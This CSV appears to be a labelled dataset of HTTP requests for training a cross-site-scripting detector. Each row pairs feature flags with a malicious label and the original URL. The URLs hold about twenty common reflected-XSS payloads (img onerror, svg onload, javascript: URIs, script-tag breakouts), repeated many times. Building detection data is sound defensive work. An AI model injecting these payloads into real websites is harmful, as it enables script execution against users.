src_port,dest_port,http_method,http_status,http_resp_len,http_url_len,url_contains_script_tag,url_contains_onerror,url_contains_onload,url_contains_onclick,url_contains_onmouseover,url_contains_onfocus,url_contains_alert,url_contains_javascript,url_contains_eval,url_contains_document,url_contains_cookie,url_contains_iframe,url_contains_svg,url_contains_img,url_contains_object,url_contains_embed,http_method_GET,http_method_POST,http_method_PUT,http_method_DELETE,url_has_query_params,url_query_param_count,url_encoded_chars,url_suspicious_chars,response_2xx,response_3xx,response_4xx,response_5xx,is_malicious,attack_type,timestamp,original_url
50764,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:55.658971+0000,/?q=<img%20src=x%20onerror=alert(1)>
50770,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:57.673593+0000,/?q=<svg%20onload=alert(1)>
50784,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:47:59.687886+0000,/?q=<iframe%20src='javascript:alert(1)'>
53624,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:01.703690+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
53630,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:03.718292+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
53632,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:05.732589+0000,/?q=<body%20onload=alert(1)>
53634,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:07.748651+0000,/?q=<details%20open%20ontoggle=alert(1)>
53636,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:09.764730+0000,"/?q=""><svg%20onload=alert(1)>"
47090,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:11.780036+0000,/?q=</textarea><script>alert(1)</script>
47104,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:13.794846+0000,/?q=<img%20src=1%20onerror=prompt(1)>
47108,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:15.809584+0000,/?q=<marquee%20onstart=confirm(1)>
47112,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:17.823902+0000,/?q=<script>/*</script><script>alert(1)</script>
47120,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:19.840041+0000,/?q=<script>''-alert(1)//</script>
38494,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:21.855277+0000,/?q=<svg><script>alert(1)</script></svg>
38510,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:23.870378+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
38514,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:25.885768+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
38528,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:27.900414+0000,/?q=<object%20data='javascript:alert(1)'>
38542,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:29.914847+0000,/?q=<embed%20src='javascript:alert(1)'>
47820,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:31.930510+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
47824,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:33.947269+0000,/?q=<script>alert(1)</script>
47826,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:35.962241+0000,/?q=<img%20src=x%20onerror=alert(1)>
47838,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:37.978497+0000,/?q=<svg%20onload=alert(1)>
47840,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:39.993160+0000,/?q=<iframe%20src='javascript:alert(1)'>
35424,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:42.007827+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
35426,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:44.022636+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
35438,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:46.036962+0000,/?q=<body%20onload=alert(1)>
35448,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:48.051980+0000,/?q=<details%20open%20ontoggle=alert(1)>
35452,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:50.066962+0000,"/?q=""><svg%20onload=alert(1)>"
51592,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:52.082718+0000,/?q=</textarea><script>alert(1)</script>
51602,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:54.098852+0000,/?q=<img%20src=1%20onerror=prompt(1)>
51618,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:48:56.115374+0000,/?q=<marquee%20onstart=confirm(1)>
51628,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:48:58.134075+0000,/?q=<script>/*</script><script>alert(1)</script>
51640,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:00.150557+0000,/?q=<script>''-alert(1)//</script>
40348,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:02.167174+0000,/?q=<svg><script>alert(1)</script></svg>
40360,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:04.183325+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
40372,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:06.200419+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
40384,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:08.216086+0000,/?q=<object%20data='javascript:alert(1)'>
40390,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:10.248061+0000,/?q=<embed%20src='javascript:alert(1)'>
44640,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:12.268597+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
44650,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:14.288943+0000,/?q=<script>alert(1)</script>
44662,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:16.309167+0000,/?q=<img%20src=x%20onerror=alert(1)>
44678,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:18.326511+0000,/?q=<svg%20onload=alert(1)>
44682,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:20.346477+0000,/?q=<iframe%20src='javascript:alert(1)'>
52978,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:22.369004+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
52992,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:24.387401+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
53004,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:26.404475+0000,/?q=<body%20onload=alert(1)>
53018,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:28.421906+0000,/?q=<details%20open%20ontoggle=alert(1)>
53028,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:30.446285+0000,"/?q=""><svg%20onload=alert(1)>"
42004,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:32.462378+0000,/?q=</textarea><script>alert(1)</script>
42014,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:34.479661+0000,/?q=<img%20src=1%20onerror=prompt(1)>
42024,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:36.495165+0000,/?q=<marquee%20onstart=confirm(1)>
42026,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:38.511548+0000,/?q=<script>/*</script><script>alert(1)</script>
42030,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:40.526645+0000,/?q=<script>''-alert(1)//</script>
57452,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:42.542832+0000,/?q=<svg><script>alert(1)</script></svg>
57464,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:44.558480+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
57476,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:46.573910+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
57488,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:48.588620+0000,/?q=<object%20data='javascript:alert(1)'>
57498,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:50.604412+0000,/?q=<embed%20src='javascript:alert(1)'>
39168,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:52.619286+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
39178,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:49:54.636543+0000,/?q=<script>alert(1)</script>
39192,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:56.651988+0000,/?q=<img%20src=x%20onerror=alert(1)>
39194,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:49:58.666318+0000,/?q=<svg%20onload=alert(1)>
39196,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:00.681548+0000,/?q=<iframe%20src='javascript:alert(1)'>
40458,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:02.695643+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
40462,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:04.710253+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
40476,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:06.725758+0000,/?q=<body%20onload=alert(1)>
40484,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:08.740268+0000,/?q=<details%20open%20ontoggle=alert(1)>
40500,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:10.754793+0000,"/?q=""><svg%20onload=alert(1)>"
36544,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:12.770717+0000,/?q=</textarea><script>alert(1)</script>
36552,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:14.784930+0000,/?q=<img%20src=1%20onerror=prompt(1)>
36556,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:16.803155+0000,/?q=<marquee%20onstart=confirm(1)>
36560,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:18.818626+0000,/?q=<script>/*</script><script>alert(1)</script>
36572,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:20.836220+0000,/?q=<script>''-alert(1)//</script>
46598,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:22.855428+0000,/?q=<svg><script>alert(1)</script></svg>
46606,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:24.873451+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
46610,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:26.889217+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
46618,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:28.904039+0000,/?q=<object%20data='javascript:alert(1)'>
40916,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:30.917788+0000,/?q=<embed%20src='javascript:alert(1)'>
40926,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:32.931437+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
40940,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:34.947038+0000,/?q=<script>alert(1)</script>
40956,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:36.961004+0000,/?q=<img%20src=x%20onerror=alert(1)>
40972,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:38.975525+0000,/?q=<svg%20onload=alert(1)>
54306,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:40.989870+0000,/?q=<iframe%20src='javascript:alert(1)'>
54312,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:43.004524+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
54314,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:45.019894+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
54326,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:47.034958+0000,/?q=<body%20onload=alert(1)>
54330,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:49.049788+0000,/?q=<details%20open%20ontoggle=alert(1)>
33160,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:51.063771+0000,"/?q=""><svg%20onload=alert(1)>"
33170,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:53.078452+0000,/?q=</textarea><script>alert(1)</script>
33172,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:55.092956+0000,/?q=<img%20src=1%20onerror=prompt(1)>
33174,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:50:57.109161+0000,/?q=<marquee%20onstart=confirm(1)>
33184,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:50:59.124829+0000,/?q=<script>/*</script><script>alert(1)</script>
37368,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:01.140192+0000,/?q=<script>''-alert(1)//</script>
37370,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:03.156640+0000,/?q=<svg><script>alert(1)</script></svg>
37372,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:05.172186+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
37378,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:07.190426+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
37394,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:09.205487+0000,/?q=<object%20data='javascript:alert(1)'>
37940,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:11.222532+0000,/?q=<embed%20src='javascript:alert(1)'>
37946,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:13.238371+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
37960,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:15.254769+0000,/?q=<script>alert(1)</script>
37968,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:17.271377+0000,/?q=<img%20src=x%20onerror=alert(1)>
37976,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:19.287928+0000,/?q=<svg%20onload=alert(1)>
50584,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:21.303067+0000,/?q=<iframe%20src='javascript:alert(1)'>
50592,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:23.318121+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
50604,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:25.334051+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
50608,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:27.349482+0000,/?q=<body%20onload=alert(1)>
50612,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:29.364239+0000,/?q=<details%20open%20ontoggle=alert(1)>
43152,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:31.379675+0000,"/?q=""><svg%20onload=alert(1)>"
43154,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:33.394734+0000,/?q=</textarea><script>alert(1)</script>
43156,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:35.409815+0000,/?q=<img%20src=1%20onerror=prompt(1)>
43170,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:51:37.426943+0000,/?q=<marquee%20onstart=confirm(1)>
43182,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:39.443434+0000,/?q=<script>/*</script><script>alert(1)</script>
36932,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:41.458739+0000,/?q=<script>''-alert(1)//</script>
36948,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:51:43.473781+0000,/?q=<svg><script>alert(1)</script></svg>
